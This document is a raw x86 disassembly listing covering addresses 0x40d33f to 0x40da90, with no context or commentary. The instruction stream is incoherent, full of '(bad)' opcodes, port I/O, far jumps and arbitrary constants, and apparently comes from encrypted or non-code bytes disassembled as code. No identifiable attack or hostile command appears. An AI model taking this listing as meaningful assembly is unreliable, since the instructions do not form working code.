  40d33f:	lods   eax,DWORD PTR ds:[esi]
  40d340:	dec    ecx
  40d341:	xchg   ebx,eax
  40d342:	cmp    BYTE PTR [edi+ecx*8+0x56],0x5e
  40d347:	sbb    ecx,ebp
  40d349:	test   DWORD PTR [edi],esi
  40d34b:	adc    BYTE PTR [ebp-0x10a77a87],0x9f
  40d352:	xchg   edx,eax
  40d353:	enter  0x2680,0x7c
  40d357:	sub    DWORD PTR [edi],ecx
  40d359:	pop    es
  40d35a:	jp     0x40d2f8
  40d35c:	aad    0xbc
  40d35e:	dec    esp
  40d35f:	into   
  40d360:	adc    DWORD PTR [eax-0x6c7ad1e],ecx
  40d366:	es aas 
  40d368:	push   edx
  40d369:	dec    edx
  40d36a:	popa   
  40d36b:	adc    ebp,edi
  40d36d:	push   eax
  40d36e:	push   esi
  40d36f:	dec    ecx
  40d370:	push   esi
  40d371:	scas   eax,DWORD PTR es:[edi]
  40d372:	mov    cl,0xd4
  40d374:	ds push ecx
  40d376:	and    dl,BYTE PTR [ebx-0x31]
  40d379:	(bad)  
  40d37b:	cwde   
  40d37c:	shl    BYTE PTR [esi-0x3706441],0xfb
  40d383:	test   DWORD PTR [edx+0x6a],0xb2526ff5
  40d38a:	loop   0x40d3f2
  40d38c:	adc    BYTE PTR [eax+0x3f],bh
  40d38f:	push   0x26ec0e9f
  40d394:	sub    BYTE PTR [esi-0x10d85ff5],dh
  40d39a:	js     0x40d40f
  40d39c:	cdq    
  40d39d:	test   BYTE PTR [edx],dh
  40d39f:	jmp    0x1747:0x4122a994
  40d3a6:	inc    eax
  40d3a7:	mov    bh,0xdf
  40d3a9:	out    dx,eax
  40d3aa:	sbb    edx,DWORD PTR [eax-0x5305a9ac]
  40d3b0:	lods   eax,DWORD PTR ds:[esi]
  40d3b1:	or     cl,BYTE PTR ds:0x48594aec
  40d3b7:	inc    edx
  40d3b8:	fs push esi
  40d3ba:	inc    edi
  40d3bb:	jns    0x40d3e6
  40d3bd:	cdq    
  40d3be:	mov    edi,DWORD PTR [ebp+0x50b1ce59]
  40d3c4:	pop    ecx
  40d3c5:	add    eax,0xe7f31285
  40d3ca:	ja     0x40d3c9
  40d3cc:	sub    al,BYTE PTR gs:[edi]
  40d3cf:	sub    edx,DWORD PTR [ebp-0x788db90d]
  40d3d5:	xchg   ebx,eax
  40d3d6:	into   
  40d3d7:	inc    ebp
  40d3d8:	mov    al,ds:0xee3223fd
  40d3dd:	inc    esp
  40d3de:	sbb    ch,BYTE PTR [edi]
  40d3e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3e1:	inc    edx
  40d3e2:	sbb    esi,DWORD PTR [esi]
  40d3e4:	mov    cl,0xe1
  40d3e6:	out    0xd7,al
  40d3e8:	cdq    
  40d3e9:	or     edx,ebp
  40d3eb:	jmp    0x40d3df
  40d3ed:	call   0x36eb:0x786d38b9
  40d3f4:	push   ds
  40d3f5:	inc    eax
  40d3f6:	es push 0x30
  40d3f9:	xchg   ebp,eax
  40d3fa:	add    cl,dl
  40d3fc:	int    0x2a
  40d3fe:	cmp    BYTE PTR ds:0xe40219fd,dh
  40d404:	adc    DWORD PTR [eax-0xb],ebp
  40d407:	or     edx,DWORD PTR [ebp+0x17aa7ae5]
  40d40d:	sub    ebx,DWORD PTR [ebx]
  40d40f:	repnz inc ebp
  40d411:	sub    DWORD PTR [ebp+0x1b],0x7f86169a
  40d418:	fisubr WORD PTR [edx+0x462b0932]
  40d41e:	ret    
  40d41f:	push   0x41
  40d421:	dec    edi
  40d422:	pushf  
  40d423:	dec    ebp
  40d424:	nop
  40d425:	popa   
  40d426:	add    DWORD PTR [esi+ebp*1-0x7e],edx
  40d42a:	stos   DWORD PTR es:[edi],eax
  40d42b:	jmp    0x8273:0x12c8e79c
  40d432:	mov    ch,0xf0
  40d434:	push   ebx
  40d435:	adc    DWORD PTR [eax-0x10],edx
  40d438:	pop    ecx
  40d439:	ins    DWORD PTR es:[edi],dx
  40d43a:	cdq    
  40d43b:	test   al,0xe0
  40d43d:	cmc    
  40d43e:	outs   dx,BYTE PTR ds:[esi]
  40d43f:	scas   eax,DWORD PTR es:[edi]
  40d440:	mov    al,0xc9
  40d442:	outs   dx,DWORD PTR ds:[esi]
  40d443:	(bad)  [ebx]
  40d445:	and    bh,ch
  40d447:	aaa    
  40d448:	pop    ecx
  40d449:	outs   dx,DWORD PTR ds:[esi]
  40d44a:	pop    ebx
  40d44b:	xor    esi,ecx
  40d44d:	push   es
  40d44e:	gs in  eax,dx
  40d450:	push   0x767e4689
  40d455:	push   0x86877f50
  40d45a:	rep outs dx,BYTE PTR ds:[esi]
  40d45c:	and    DWORD PTR [edi+0x73],edx
  40d45f:	int3   
  40d460:	(bad)  
  40d462:	xchg   ecx,eax
  40d463:	cmp    DWORD PTR [esi-0x44],esi
  40d466:	rcl    DWORD PTR [eax+0x7078dc70],1
  40d46c:	or     bh,BYTE PTR [ecx-0x6b]
  40d46f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d470:	mov    dl,0x7c
  40d472:	mov    WORD PTR [esi],?
  40d474:	xchg   ebp,eax
  40d475:	retf   0x9158
  40d478:	cmc    
  40d479:	addr16 xchg edx,eax
  40d47b:	or     al,0x5
  40d47d:	loop   0x40d411
  40d47f:	mov    cl,0x71
  40d481:	push   esp
  40d482:	test   BYTE PTR [edx-0x38],ah
  40d485:	outs   dx,BYTE PTR ds:[esi]
  40d486:	test   eax,0xc3bd7b45
  40d48b:	xor    eax,0x78
  40d48e:	stc    
  40d48f:	loopne 0x40d47a
  40d491:	ror    DWORD PTR [esi+edi*1],0x80
  40d495:	outs   dx,BYTE PTR ds:[esi]
  40d496:	ret    0xd1dc
  40d499:	adc    BYTE PTR [esi],bh
  40d49b:	xor    DWORD PTR [edx],edx
  40d49d:	dec    ebp
  40d49e:	and    eax,DWORD PTR [eax]
  40d4a0:	sbb    edx,DWORD PTR [ecx]
  40d4a2:	fld    DWORD PTR [edx-0x10]
  40d4a5:	jg     0x40d49c
  40d4a7:	repz fstp QWORD PTR [ebx+eiz*1-0x2d]
  40d4ac:	xor    BYTE PTR [eax+0x2e2e611],bh
  40d4b2:	mov    al,0x46
  40d4b4:	inc    ecx
  40d4b5:	call   0xae396e26
  40d4ba:	jmp    0x52fe:0xf094ab5d
  40d4c1:	mov    ecx,0xa7b2abbc
  40d4c6:	shl    DWORD PTR [ecx+0x3b7b80e4],1
  40d4cc:	dec    esi
  40d4cd:	jnp    0x40d4eb
  40d4cf:	stc    
  40d4d0:	popa   
  40d4d1:	mov    eax,0xe9082797
  40d4d6:	jae    0x40d4da
  40d4d8:	leave  
  40d4d9:	repnz mov bh,0xa9
  40d4dc:	mov    ch,0x5f
  40d4de:	scas   al,BYTE PTR es:[edi]
  40d4df:	adc    bl,al
  40d4e1:	(bad)  gs:[ecx-0x44]
  40d4e5:	cmp    BYTE PTR [ebp+0x6c02b925],bl
  40d4eb:	ficom  DWORD PTR [ebp+0x64]
  40d4ee:	in     al,0x8c
  40d4f0:	leave  
  40d4f1:	inc    eax
  40d4f2:	idiv   DWORD PTR [esi+0x53765aa3]
  40d4f8:	adc    al,BYTE PTR [ecx]
  40d4fa:	dec    esp
  40d4fb:	sbb    al,0x68
  40d4fd:	push   edi
  40d4fe:	cs push esp
  40d500:	in     al,dx
  40d501:	pushf  
  40d502:	cs nop
  40d504:	out    dx,al
  40d505:	inc    edi
  40d506:	inc    esi
  40d507:	adc    al,0xc0
  40d509:	ins    BYTE PTR es:[edi],dx
  40d50a:	mov    dh,0x56
  40d50c:	imul   eax,edx,0xffffffd9
  40d50f:	xchg   esp,eax
  40d510:	fdecstp 
  40d512:	sub    ebp,edx
  40d514:	lock repnz mov DWORD PTR [eax-0x2a0a13ac],ecx
  40d51c:	jns    0x40d4ae
  40d51e:	pop    ebx
  40d51f:	push   edx
  40d520:	sub    BYTE PTR [edi+ebx*2-0x25c18caf],ah
  40d527:	pop    edi
  40d528:	jmp    0x31bea8f4
  40d52d:	jl     0x40d4bf
  40d52f:	test   DWORD PTR [edi],ebx
  40d531:	push   edx
  40d532:	fbstp  TBYTE PTR [ebp+0x7e]
  40d535:	jmp    0xc90e:0x9227f88c
  40d53c:	mov    bl,0x6f
  40d53e:	cmp    bl,BYTE PTR [ebx]
  40d540:	fwait
  40d541:	xlat   BYTE PTR ds:[ebx]
  40d542:	aaa    
  40d543:	dec    eax
  40d544:	push   0xffffffed
  40d546:	aas    
  40d547:	pop    esp
  40d548:	adc    eax,eax
  40d54a:	iret   
  40d54b:	jbe    0x40d592
  40d54d:	gs and dl,bh
  40d550:	mov    dh,0x96
  40d552:	jecxz  0x40d4d9
  40d554:	mov    dh,0x71
  40d556:	popa   
  40d557:	jl     0x40d542
  40d559:	push   ss
  40d55a:	cld    
  40d55b:	lock mov bh,BYTE PTR [ecx]
  40d55e:	push   edx
  40d55f:	inc    edx
  40d560:	jmp    0xda72:0xc909b1a2
  40d567:	data16 in al,dx
  40d569:	jno    0x40d541
  40d56b:	mov    edi,DWORD PTR ds:0x5eca7568
  40d571:	in     al,0xe6
  40d573:	add    al,0xdb
  40d575:	xchg   ebx,eax
  40d576:	cmp    bl,BYTE PTR [ebx+0x7cbaf7e5]
  40d57c:	into   
  40d57d:	lea    edi,[edx+eiz*8-0x5fe22f88]
  40d584:	lock fld QWORD PTR [edi+eiz*1]
  40d588:	dec    edx
  40d589:	mov    al,0xf3
  40d58b:	ret    0x5879
  40d58e:	jg     0x40d511
  40d590:	xor    ecx,DWORD PTR [ecx-0x45]
  40d593:	push   ds
  40d594:	out    dx,eax
  40d595:	adc    edi,esi
  40d597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d598:	les    esp,FWORD PTR [bp+di]
  40d59b:	cmp    DWORD PTR [esi],ecx
  40d59d:	jnp    0x40d541
  40d59f:	or     ecx,ebx
  40d5a1:	out    dx,eax
  40d5a2:	scas   al,BYTE PTR es:[edi]
  40d5a3:	mov    DWORD PTR [ebp+0x5b2702a9],ebp
  40d5a9:	mov    esp,0x904c726f
  40d5ae:	btr    esi,edi
  40d5b1:	js     0x40d631
  40d5b3:	add    ah,BYTE PTR [ecx+0x3e]
  40d5b6:	inc    ebx
  40d5b7:	mov    al,ds:0xb41633c
  40d5bc:	inc    ebp
  40d5be:	sub    eax,0x5aa545e
  40d5c3:	ret    
  40d5c4:	bound  ebp,QWORD PTR [ebx-0x5493ebbc]
  40d5ca:	outs   dx,BYTE PTR ds:[esi]
  40d5cb:	test   al,0xc1
  40d5cd:	mov    ch,BYTE PTR [edi+0x1d]
  40d5d0:	xchg   esp,eax
  40d5d1:	(bad)  
  40d5d2:	(bad)  
  40d5d3:	pop    edx
  40d5d4:	cdq    
  40d5d5:	outs   dx,DWORD PTR ds:[esi]
  40d5d6:	ss inc ecx
  40d5d8:	push   0xb
  40d5da:	mov    bh,0xbd
  40d5dc:	test   al,0x6d
  40d5de:	and    DWORD PTR [eax+0x43],esi
  40d5e1:	or     al,0xa6
  40d5e3:	(bad)  
  40d5e4:	aas    
  40d5e5:	sbb    esp,DWORD PTR [ecx+0x654b9b38]
  40d5eb:	xchg   bh,al
  40d5ed:	js     0x40d652
  40d5ef:	xchg   ebp,eax
  40d5f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5f1:	nop
  40d5f2:	xor    cl,BYTE PTR [edx]
  40d5f4:	inc    esp
  40d5f5:	add    BYTE PTR [esi+esi*8],ch
  40d5f8:	ret    0xe4ad
  40d5fb:	mov    esp,DWORD PTR [edx-0x5251e3cf]
  40d601:	shr    bh,0x87
  40d604:	mov    dl,0xb0
  40d606:	jmp    0x6f6b:0x346c9f4c
  40d60d:	repnz arpl WORD PTR [ebx-0x57],bx
  40d611:	and    ebp,DWORD PTR [esi+0x77]
  40d614:	scas   al,BYTE PTR es:[edi]
  40d615:	retf   
  40d616:	inc    ebx
  40d617:	cmp    BYTE PTR fs:[ebx],bl
  40d61a:	push   DWORD PTR [ebp+0x63924fa3]
  40d620:	mov    eax,0x624a846f
  40d625:	jge    0x40d5da
  40d627:	mov    bl,0x84
  40d629:	sti    
  40d62a:	test   DWORD PTR [ebp-0x20],0x29c98813
  40d631:	mov    ecx,0x168015a
  40d636:	jo     0x40d65b
  40d638:	mov    ebp,gs
  40d63a:	jne    0x40d5dc
  40d63c:	lahf   
  40d63d:	fwait
  40d63e:	or     eax,0xafb30115
  40d643:	adc    esi,DWORD PTR [edi-0x7e11c65c]
  40d649:	loopne 0x40d679
  40d64b:	push   esi
  40d64c:	cmp    DWORD PTR [edi],edx
  40d64e:	inc    ecx
  40d64f:	leave  
  40d650:	les    ecx,FWORD PTR [edi+0x43]
  40d653:	jns    0x40d607
  40d655:	adc    esi,eax
  40d657:	xor    DWORD PTR [ebp-0x29f51e00],esp
  40d65d:	out    0x28,eax
  40d65f:	mov    ecx,0x6e076d60
  40d664:	cli    
  40d665:	fst    DWORD PTR ds:0x66bac42f
  40d66b:	mov    edi,0xa903ef5a
  40d670:	add    ch,BYTE PTR [eax+0x4481fa90]
  40d676:	ss xor al,0xa8
  40d679:	lods   al,BYTE PTR ds:[esi]
  40d67a:	std    
  40d67b:	ror    BYTE PTR [edx+0x4a],0x49
  40d67f:	pop    DWORD PTR [edx-0x33b62e02]
  40d685:	sub    eax,0x918ec02d
  40d68a:	cmp    al,0x38
  40d68c:	and    BYTE PTR [eax],0x82
  40d68f:	pop    es
  40d690:	fbstp  TBYTE PTR [ebx+0x21]
  40d693:	add    ah,BYTE PTR [edi+0x3ec84f]
  40d699:	jb     0x40d6ed
  40d69b:	fild   DWORD PTR [edi]
  40d69d:	xchg   ebx,eax
  40d69e:	xor    esi,DWORD PTR [esi+0x2]
  40d6a1:	ficom  DWORD PTR [ecx]
  40d6a3:	add    BYTE PTR [ecx+0x0],dl
  40d6a6:	jbe    0x40d6f9
  40d6a8:	push   eax
  40d6a9:	jge    0x40d70f
  40d6ab:	push   esi
  40d6ac:	add    BYTE PTR [ebx],dh
  40d6ae:	adc    DWORD PTR [eax],eax
  40d6b0:	outs   dx,DWORD PTR ds:[esi]
  40d6b1:	push   esp
  40d6b2:	add    BYTE PTR [edi-0x6b],al
  40d6b5:	or     esi,eax
  40d6b7:	push   esi
  40d6b8:	jg     0x40d712
  40d6ba:	inc    edx
  40d6bb:	push   ss
  40d6bc:	and    al,0xa8
  40d6be:	sub    ah,bh
  40d6c0:	mov    ebp,ss
  40d6c2:	xlat   BYTE PTR ds:[ebx]
  40d6c3:	pop    esp
  40d6c4:	push   esp
  40d6c5:	xor    cl,0x93
  40d6c8:	push   ebx
  40d6c9:	mov    BYTE PTR [esi-0x17],ch
  40d6cc:	dec    edx
  40d6cd:	sti    
  40d6ce:	cld    
  40d6cf:	push   eax
  40d6d0:	pop    ss
  40d6d1:	adc    dl,BYTE PTR [eax-0x66]
  40d6d4:	jo     0x40d755
  40d6d6:	and    cl,BYTE PTR [ebx]
  40d6d8:	das    
  40d6d9:	jp     0x40d68d
  40d6db:	and    eax,0x58d831dd
  40d6e0:	test   DWORD PTR ds:0x4ac50a73,ecx
  40d6e6:	out    0x9c,al
  40d6e8:	cwde   
  40d6e9:	ret    0x76a7
  40d6ec:	dec    esp
  40d6ed:	dec    eax
  40d6ee:	jbe    0x40d710
  40d6f0:	iret   
  40d6f1:	pop    ss
  40d6f2:	cmp    al,0xd9
  40d6f4:	sbb    DWORD PTR [ecx-0x4743ace3],edx
  40d6fa:	(bad)  
  40d6fb:	outs   dx,BYTE PTR ds:[esi]
  40d6fc:	call   0x7734:0x31e18d83
  40d703:	or     eax,0xd68e6848
  40d708:	push   esi
  40d709:	dec    edi
  40d70a:	stos   BYTE PTR es:[edi],al
  40d70b:	sahf   
  40d70c:	pop    eax
  40d70d:	pop    ebx
  40d70e:	mov    bl,0x9f
  40d710:	imul   esp,DWORD PTR [ecx-0x61],0xffffff8b
  40d714:	jmp    0xd8c5628e
  40d719:	(bad)  
  40d71b:	sub    BYTE PTR fs:[eax],al
  40d71e:	xor    esi,DWORD PTR [edx]
  40d720:	mov    dl,0x4c
  40d722:	cmc    
  40d723:	dec    edi
  40d724:	into   
  40d725:	scas   ax,WORD PTR es:[edi]
  40d727:	int    0xc1
  40d729:	out    dx,al
  40d72a:	xchg   esi,eax
  40d72b:	dec    edx
  40d72c:	lods   al,BYTE PTR ds:[esi]
  40d72d:	mov    ecx,0xc5de1aa7
  40d732:	mov    ch,0x38
  40d734:	jle    0x40d72d
  40d736:	jle    0x40d724
  40d738:	fidiv  WORD PTR [edi]
  40d73a:	mov    DWORD PTR [eax+0x656a8e3f],esp
  40d740:	loope  0x40d7ba
  40d742:	je     0x40d71e
  40d744:	inc    eax
  40d745:	dec    ecx
  40d746:	xchg   ecx,eax
  40d747:	mov    al,0xdb
  40d749:	lods   al,BYTE PTR ds:[esi]
  40d74a:	mov    BYTE PTR [esi+eiz*2+0x2a],dh
  40d74e:	es stc 
  40d750:	btc    DWORD PTR [ebp-0x27e2a43],0x2c
  40d758:	lahf   
  40d759:	dec    esi
  40d75a:	add    eax,0xfa46441
  40d75f:	pop    ecx
  40d760:	aad    0xed
  40d762:	int    0x60
  40d764:	pop    ds
  40d765:	cmp    al,0x89
  40d767:	push   edx
  40d768:	fnstcw WORD PTR [eax+0x35]
  40d76b:	out    dx,eax
  40d76c:	mov    ss,WORD PTR [esi]
  40d76e:	clc    
  40d76f:	fidiv  WORD PTR [edi+0x599e2c4d]
  40d775:	push   ss
  40d776:	cmp    al,0x88
  40d778:	cdq    
  40d779:	int3   
  40d77a:	out    dx,eax
  40d77b:	mov    ecx,0x6cddaea0
  40d780:	inc    ebp
  40d781:	test   eax,0xcca26def
  40d786:	in     al,0x8b
  40d788:	fmul   QWORD PTR [eax-0x659eacbe]
  40d78e:	aaa    
  40d78f:	pop    ebp
  40d790:	pop    esp
  40d791:	xchg   ebp,eax
  40d792:	scas   al,BYTE PTR es:[edi]
  40d793:	pusha  
  40d794:	inc    eax
  40d795:	or     DWORD PTR [edi+0x6f],edi
  40d798:	pop    ebp
  40d799:	xor    esi,ebp
  40d79b:	aas    
  40d79c:	cmp    eax,0x30949b89
  40d7a1:	aam    0xa9
  40d7a3:	lds    ebx,FWORD PTR [edx+edx*8+0x1b]
  40d7a7:	inc    edx
  40d7a8:	test   al,0xb8
  40d7aa:	add    al,0x5b
  40d7ac:	jmp    0x40d739
  40d7ae:	and    al,0x4
  40d7b0:	js     0x40d78d
  40d7b2:	jb     0x40d7db
  40d7b4:	or     eax,0xb099e776
  40d7b9:	cld    
  40d7ba:	iret   
  40d7bb:	or     al,0x51
  40d7bd:	adc    ah,BYTE PTR [ebp-0x5d]
  40d7c0:	inc    ebp
  40d7c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7c2:	mov    eax,0x130a65b2
  40d7c7:	adc    esp,DWORD PTR [ebp-0x10]
  40d7ca:	stc    
  40d7cb:	xchg   BYTE PTR [ecx-0x32cf54d4],dh
  40d7d1:	mov    DWORD PTR [eax+0x3ebd4061],ebx
  40d7d7:	xor    bx,WORD PTR [eax]
  40d7da:	out    0x52,eax
  40d7dc:	add    BYTE PTR [eax+0x67e6afa5],bl
  40d7e2:	fld    QWORD PTR [edx-0x80]
  40d7e5:	pop    esp
  40d7e6:	pop    ss
  40d7e7:	mov    bh,0x6c
  40d7e9:	hlt    
  40d7ea:	dec    ebx
  40d7eb:	mov    edx,0x8ca18b33
  40d7f0:	ja     0x40d778
  40d7f2:	add    eax,0xf2f917fe
  40d7f7:	lock aam 0x84
  40d7fa:	pop    edx
  40d7fb:	das    
  40d7fc:	pop    esi
  40d7fd:	das    
  40d7fe:	outs   dx,BYTE PTR ds:[esi]
  40d7ff:	sub    BYTE PTR [ebx-0x2e36db7],cl
  40d805:	jg     0x40d7ed
  40d807:	jbe    0x40d819
  40d809:	(bad)
  40d80c:	jb     0x40d7c2
  40d80e:	stos   BYTE PTR es:[edi],al
  40d80f:	fadd   DWORD PTR [ebx-0x7b7b1772]
  40d815:	sbb    DWORD PTR [ecx-0x38133e15],0xffffffac
  40d81c:	icebp  
  40d81d:	nop
  40d81e:	fs (bad) 
  40d821:	xor    eax,0x8b307a62
  40d826:	mov    BYTE PTR [edi+eax*1-0x653087dd],dh
  40d82d:	xor    dl,BYTE PTR [ecx-0x51509467]
  40d833:	rcl    BYTE PTR ds:0x2158824,0x38
  40d83a:	mov    cl,0xad
  40d83c:	adc    ebx,ebx
  40d83e:	inc    esi
  40d83f:	inc    edx
  40d840:	sbb    ebp,edi
  40d842:	out    dx,eax
  40d843:	xor    eax,0x7ff666fa
  40d848:	(bad)  
  40d849:	push   esp
  40d84a:	pusha  
  40d84b:	jnp    0x40d83f
  40d84d:	hlt    
  40d84e:	bound  esp,QWORD PTR [edi]
  40d850:	rcl    DWORD PTR [edi-0x1170a328],0x42
  40d857:	pop    ds
  40d858:	jmp    0xad9:0xfd6213c2
  40d85f:	div    DWORD PTR [edi+0x21]
  40d862:	pop    ecx
  40d863:	pop    ebp
  40d864:	and    al,0xee
  40d866:	add    BYTE PTR [ebx+0x5f9de4b9],ch
  40d86c:	das    
  40d86d:	jno    0x40d8b8
  40d86f:	pop    ebp
  40d870:	push   cs
  40d871:	call   0x2553:0xfe14c129
  40d878:	jle    0x40d8c3
  40d87a:	out    0xd8,al
  40d87c:	mov    al,0xac
  40d87e:	push   eax
  40d87f:	dec    esi
  40d880:	lds    esp,FWORD PTR [eax-0x66]
  40d883:	in     eax,dx
  40d884:	xchg   ebx,eax
  40d885:	sbb    eax,0x797db883
  40d88a:	xchg   ebp,eax
  40d88b:	pop    eax
  40d88c:	jg     0x40d8fc
  40d88e:	xchg   edx,eax
  40d88f:	icebp  
  40d890:	neg    BYTE PTR [ebp+0x14d0b2c4]
  40d896:	fidiv  WORD PTR [edi-0x754e7032]
  40d89c:	sbb    al,0x49
  40d89e:	add    eax,0x8663a966
  40d8a3:	push   ds
  40d8a4:	mov    bh,0x44
  40d8a6:	fsub   QWORD PTR [ebx-0x65]
  40d8a9:	outs   dx,BYTE PTR ds:[esi]
  40d8aa:	push   esi
  40d8ab:	retf   
  40d8ac:	and    al,0xa6
  40d8ae:	or     ah,0x74
  40d8b1:	(bad)  
  40d8b2:	(bad)  [eax+0x6fad371e]
  40d8b8:	xor    bh,BYTE PTR [ebp-0x1ecb471a]
  40d8be:	in     al,dx
  40d8bf:	and    DWORD PTR [eax+0x2ee68d4c],edx
  40d8c5:	aaa    
  40d8c6:	sub    al,BYTE PTR [eax+0xab47f0b]
  40d8cc:	stc    
  40d8cd:	push   ebp
  40d8ce:	in     eax,dx
  40d8cf:	cwde   
  40d8d0:	(bad)  
  40d8d1:	xchg   edi,eax
  40d8d2:	ins    BYTE PTR es:[edi],dx
  40d8d3:	cld    
  40d8d4:	out    0xcf,al
  40d8d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8d7:	test   ch,bl
  40d8d9:	mov    ebp,0xc640bea5
  40d8de:	out    0xb5,al
  40d8e0:	nop
  40d8e1:	repz imul ebx,DWORD PTR [ebp-0x20fddc83],0xffffffca
  40d8e9:	retf   0x2812
  40d8ec:	sbb    DWORD PTR [ecx],ebx
  40d8ee:	adc    ecx,DWORD PTR ds:0x9d482ccf
  40d8f4:	add    eax,ecx
  40d8f6:	adc    BYTE PTR [edi-0x393150d2],dl
  40d8fc:	push   ebx
  40d8fd:	xchg   ebp,eax
  40d8fe:	stos   BYTE PTR es:[edi],al
  40d8ff:	aad    0xa4
  40d901:	jmp    ecx
  40d903:	inc    eax
  40d904:	add    al,0x4d
  40d906:	test   DWORD PTR [ecx-0x24],esi
  40d909:	jl     0x40d970
  40d90b:	add    eax,0x67d637aa
  40d910:	sub    BYTE PTR [eax],al
  40d912:	jae    0x40d8d6
  40d914:	ins    DWORD PTR es:[edi],dx
  40d915:	pop    edi
  40d916:	pop    ss
  40d917:	(bad)  
  40d918:	arpl   bx,dx
  40d91a:	xchg   DWORD PTR [edi-0x5c11630f],eax
  40d920:	lods   eax,DWORD PTR ds:[esi]
  40d921:	sub    al,0xec
  40d923:	add    eax,0xdd0d66ef
  40d928:	nop
  40d929:	xchg   edx,eax
  40d92a:	leave  
  40d92b:	mov    ebx,?
  40d92d:	icebp  
  40d92e:	mov    ds:0x2fad78d4,al
  40d933:	ja     0x40d961
  40d935:	fdivr  st(3),st
  40d937:	push   0xffffff81
  40d939:	push   DWORD PTR [ecx+0x32]
  40d93c:	dec    edi
  40d93d:	and    BYTE PTR [ecx+edi*4-0x3e],bh
  40d941:	leave  
  40d942:	repz inc ebx
  40d944:	ret    
  40d945:	fsub   DWORD PTR [ebp-0x275b9bfc]
  40d94b:	das    
  40d94c:	sub    BYTE PTR fs:[ebx-0x2],ah
  40d950:	lods   al,BYTE PTR ds:[esi]
  40d951:	xor    cl,ch
  40d953:	jp     0x40d95d
  40d955:	aad    0xa5
  40d957:	mov    ecx,0xe1023038
  40d95c:	mov    DWORD PTR [eax-0x66],ecx
  40d95f:	xor    DWORD PTR ds:0x3df1af96,ebp
  40d965:	cmp    al,0x6c
  40d967:	xchg   esi,eax
  40d968:	out    0x4f,eax
  40d96a:	nop
  40d96b:	and    edi,DWORD PTR [ecx-0x11]
  40d96e:	rcl    BYTE PTR [eax+0x6],0x2
  40d972:	ror    BYTE PTR [ebx+0x5e8b8f5f],1
  40d978:	pop    ss
  40d979:	adc    dh,BYTE PTR ss:[edx+0x6c911b9b]
  40d980:	scas   eax,DWORD PTR es:[edi]
  40d981:	or     edi,DWORD PTR [ebp+0xdf8dc36]
  40d987:	ds mov esi,0x6c80e6e2
  40d98d:	and    dl,0x81
  40d990:	sub    BYTE PTR [edi],ch
  40d992:	pushf  
  40d993:	mov    gs,WORD PTR [edx]
  40d995:	inc    ecx
  40d996:	mul    BYTE PTR [edx-0x79]
  40d999:	ins    BYTE PTR es:[edi],dx
  40d99a:	in     eax,dx
  40d99b:	cmc    
  40d99c:	loop   0x40d961
  40d99e:	cmp    DWORD PTR [eax],0xd4493c7a
  40d9a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9a5:	mov    BYTE PTR [ecx-0x12],ah
  40d9a8:	sti    
  40d9a9:	jg     0x40d9a0
  40d9ab:	les    esi,FWORD PTR [eax-0x2c8dc49c]
  40d9b1:	jnp    0x53a0385b
  40d9b7:	sub    BYTE PTR [edi+ebp*8-0x57],ah
  40d9bb:	nop
  40d9bc:	mov    bl,0xe9
  40d9be:	dec    esi
  40d9bf:	sub    ecx,DWORD PTR [edx]
  40d9c1:	push   esi
  40d9c2:	add    edx,ebp
  40d9c4:	mov    BYTE PTR [eax],bh
  40d9c6:	adc    eax,0xb1b07f97
  40d9cb:	sbb    al,0xcf
  40d9cd:	sahf   
  40d9ce:	mul    dl
  40d9d0:	mov    bh,BYTE PTR [ebx]
  40d9d2:	sbb    dh,BYTE PTR [eax+0x93e8dfc]
  40d9d8:	add    DWORD PTR [esi],ebx
  40d9da:	ficom  WORD PTR ds:0x1d4cec7
  40d9e0:	cmp    ch,BYTE PTR [esi+0x11]
  40d9e3:	mov    eax,ds:0x73404959
  40d9e8:	xchg   edx,eax
  40d9e9:	frstor [edx+0x2a409c00]
  40d9ef:	sub    BYTE PTR [esi],0x22
  40d9f2:	add    ch,ah
  40d9f4:	arpl   WORD PTR [eax+ebp*4-0x77],dx
  40d9f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9f9:	(bad)  
  40d9fa:	outs   dx,BYTE PTR ds:[esi]
  40d9fb:	mov    ecx,0xefbb0ab2
  40da00:	out    dx,eax
  40da01:	mov    BYTE PTR [edx+0x10a2e5cd],0xe2
  40da08:	daa    
  40da09:	jp     0x40d9ef
  40da0b:	jnp    0x40d9c5
  40da0d:	ret    
  40da0e:	jmp    0xfa73a48e
  40da13:	std    
  40da14:	push   cs
  40da15:	lods   eax,DWORD PTR ds:[esi]
  40da16:	dec    ebp
  40da17:	dec    ebp
  40da18:	jbe    0x40da15
  40da1a:	fst    QWORD PTR [ebp-0x10]
  40da1d:	push   ds
  40da1e:	(bad)  
  40da1f:	loop   0x40d9f9
  40da21:	(bad)  
  40da22:	xor    BYTE PTR [edx-0x76],dh
  40da25:	cmp    al,0x72
  40da27:	pop    edx
  40da28:	adc    BYTE PTR [ebx],dl
  40da2a:	jg     0x40da2a
  40da2c:	jnp    0x40d9c7
  40da2e:	pop    ds
  40da2f:	aas    
  40da30:	call   0x59716c5e
  40da35:	call   ecx
  40da37:	ss popa 
  40da39:	je     0x40d9d4
  40da3b:	sahf   
  40da3c:	cmp    edi,DWORD PTR [ebp-0x2]
  40da3f:	push   0xfffffff8
  40da41:	mov    esi,0x759243b0
  40da46:	call   0xfcd0479a
  40da4b:	(bad)  
  40da4d:	cmp    BYTE PTR [ebx+0x113582d],0xd8
  40da54:	retf   0x7ec1
  40da57:	mov    edi,0x2e68191b
  40da5c:	sbb    BYTE PTR ds:0x19c27ac9,bh
  40da62:	sbb    ch,ch
  40da64:	lock and DWORD PTR cs:[ecx+0x79],esi
  40da69:	sub    eax,0xa3f4ee6a
  40da6e:	mul    DWORD PTR [edi-0x5f]
  40da71:	xor    al,0x32
  40da73:	and    bh,BYTE PTR [ecx]
  40da75:	dec    edx
  40da76:	popa   
  40da77:	(bad)  
  40da79:	cmp    DWORD PTR ds:0x542c7e6c,esp
  40da7f:	and    BYTE PTR [esi],bh
  40da81:	aas    
  40da82:	adc    eax,0x9d523e80
  40da87:	xchg   ebp,eax
  40da88:	jb     0x40da73
  40da8a:	out    dx,eax
  40da8b:	jae    0x40da98
  40da8d:	repnz sar ah,cl
  40da90:	sub    dh,bl
